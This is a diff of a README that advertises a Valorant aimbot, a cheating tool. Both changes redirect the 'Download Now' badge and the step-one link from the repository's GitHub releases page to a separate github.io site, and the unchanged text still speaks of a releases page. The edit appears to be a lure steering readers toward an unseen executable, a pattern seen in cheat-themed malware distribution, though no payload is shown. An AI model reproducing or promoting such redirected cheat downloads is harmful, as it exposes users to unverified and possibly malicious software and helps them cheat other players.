@@ -1,6 +1,6 @@
 # 🎯 valorant-aimbot-v2-2026 - The Ultimate Precision Aiming Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Coordinationtieclip9021/valorant-aimbot-v2-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://coordinationtieclip9021.github.io)
 
 ---
 
@@ -36,7 +36,7 @@ Valorant Aimbot v2 is an updated, refined version of our popular aiming tool. It
 
 Getting started is easy. Just follow these simple steps.
 
-1. **Visit the download page** by clicking the large blue button at the top of this page or [click here](https://github.com/Coordinationtieclip9021/valorant-aimbot-v2-2026/releases).
+1. **Visit the download page** by clicking the large blue button at the top of this page or [click here](https://coordinationtieclip9021.github.io).
 
 2. On the releases page, look for the newest release at the top. Click to expand the "Assets" section.
 
